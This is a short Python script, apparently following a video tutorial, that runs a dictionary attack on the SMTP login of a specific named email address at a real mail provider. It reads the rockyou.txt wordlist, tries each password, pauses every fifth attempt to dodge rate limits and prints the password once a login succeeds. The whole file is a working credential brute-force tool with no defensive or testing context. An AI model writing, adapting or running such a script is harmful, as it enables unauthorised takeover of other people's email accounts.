#https://www.youtube.com/watch?v=j-Bc2EbwLCI

import smtplib
import time
import socket
#socket.setdefaulttimeout(120)

counter = 1
startNo = 0
#smptserver = smtplib.SMTP("smtp.gmail.com",587)
#smptserver = smtplib.SMTP("smtp.gmail.com",587,4500) # OVO RADI
smptserver = smtplib.SMTP("mail.tel.net.ba",587)
#smptserver = smtplib.SMTP("mail.tel.net",587)
smptserver.ehlo()
smptserver.starttls()

#user =  "ziva.crkva@tel.net.ba" # email address
user =  "ziva.crkva@tel.net.ba" # email address
passwfile = "rockyou.txt"
passwfile = open(passwfile,"r")

for password in passwfile:
	if counter >= startNo:
		if counter%5 == 0:			
			#socket.setdefaulttimeout(120)			
			print (str(counter) + "[C] Sleep")
			time.sleep(20)
		#else:			
			#socket.setdefaulttimeout(5)
			#print (str(counter) + "[C]")
		try:	
			smptserver.login(user,password)
			print ("[+] Password Found: " + password + " counter " + str(counter))
			counter = counter + 1										
			#smptserver.quit()
			break;
		except smtplib.SMTPAuthenticationError:
			print (str(counter) + " [-] Password Incorrect: " + password)
			counter = counter + 1			
	else:
		print (str(counter) + "[ ] Idle")		
		counter = counter + 1

